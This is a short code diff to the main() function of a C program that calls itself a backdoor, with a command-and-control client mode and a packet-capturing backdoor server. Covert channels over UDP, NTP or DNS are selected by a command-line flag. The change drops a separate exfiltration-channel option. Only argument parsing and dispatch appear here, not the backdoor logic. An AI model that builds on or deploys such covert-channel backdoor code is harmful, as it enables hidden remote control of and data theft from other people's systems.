@@ -39,7 +39,6 @@ int main(int argc, char *argv[])
 	int c;
 	int client = FALSE;
 	int command_chan = CHAN_UDP;
-	int exfil_chan = CHAN_UDP;
 	char rmthost[MAX_LEN];
 	char filter[MAX_LEN];
 	char folder[MAX_LEN];
@@ -69,21 +68,13 @@ int main(int argc, char *argv[])
 			case 'w':
 				strncpy(folder, optarg, MAX_LEN);
 				break;
-			case 'm':
+			case 'x':
 				if (optarg[0] == 'u')
 					command_chan = CHAN_UDP;
 				else if (optarg[0] == 'n')
 					command_chan = CHAN_NTP;
 				else if (optarg[0] == 'i')
 					command_chan = CHAN_DNS;
-				break;
-			case 'x':
-				if (optarg[0] == 'u')
-					exfil_chan = CHAN_UDP;
-				else if (optarg[0] == 'n')
-					exfil_chan = CHAN_NTP;
-				else if (optarg[0] == 'i')
-					exfil_chan = CHAN_DNS;
 				break;
 			case 'p':
 				port = atoi(optarg);
@@ -108,9 +99,9 @@ int main(int argc, char *argv[])
 	ipaddr = resolve(rmthost);
 
 	if (client) // C&C Client
-		backdoor_client(ipaddr, port, command_chan, exfil_chan); // Start command entry
+		backdoor_client(ipaddr, port, command_chan); // Start command entry
 	else // Backdoor Server
-		pcap_start(filter, ipaddr, folder, command_chan, exfil_chan);
+		pcap_start(filter, ipaddr, folder, command_chan);
 	
 	return 0;
 }
